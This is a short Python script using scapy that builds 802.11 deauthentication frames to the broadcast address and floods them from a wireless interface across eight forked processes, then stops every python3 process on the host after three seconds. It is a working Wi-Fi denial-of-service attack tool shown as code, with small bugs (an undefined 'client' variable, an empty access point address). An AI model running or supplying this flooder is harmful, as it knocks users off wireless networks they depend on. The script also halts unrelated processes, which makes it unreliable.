from scapy.all import * 
import os 
from time import * 
import psutil
import signal #Importing required modules

conf.use_pcap = True
monitor = True

client_mac = "ff:ff:ff:ff:ff:ff" #Client MAC, ff:ff:ff:ff:ff:ff for broadcast.
gateway_mac = "" #AP MAC

dot11 = Dot11(addr1=client, addr2=gateway_mac, addr3=gateway_mac) #802.11 packet addresses

frame = RadioTap()/dot11 #Building the packet as 'frame'
frame.show() #Printing the packet to be transmitted

start = time()


fork1 = os.fork() #3 forks, creating a total of 8 processes
fork2 = os.fork()
fork3 = os.fork()

packet = RadioTap()/dot11/Dot11Deauth(reason=7) #Specifiy the type of packet to send. Deauth and the reason code (1-7)

if fork1 != 0 and fork2 != 0 and fork3 != 0:
    sleep(3) #Specifiy the time to run the packet transmission before ending
    print(os.getpid())
    for process in psutil.process_iter (): #Iterate through PIDs
        if "python3" not in process.name() or process.pid == os.getpid(): #If the process is not python3 or one of our fork PIDs
            continue 
        ID = process.pid # ID of the process
        print (ID)
        os.kill(ID,signal.SIGSTOP) #Kill the PIDs that we identified to be python3 above.

else:
    ID = os.getpid()
    sendp(packet, inter=0.001, loop=1, iface="wlan0", verbose=0) #Sending the frame, the transmission interval and loop OR count.


print(f'Time taken to run: {time() - start} seconds') #Display time taken



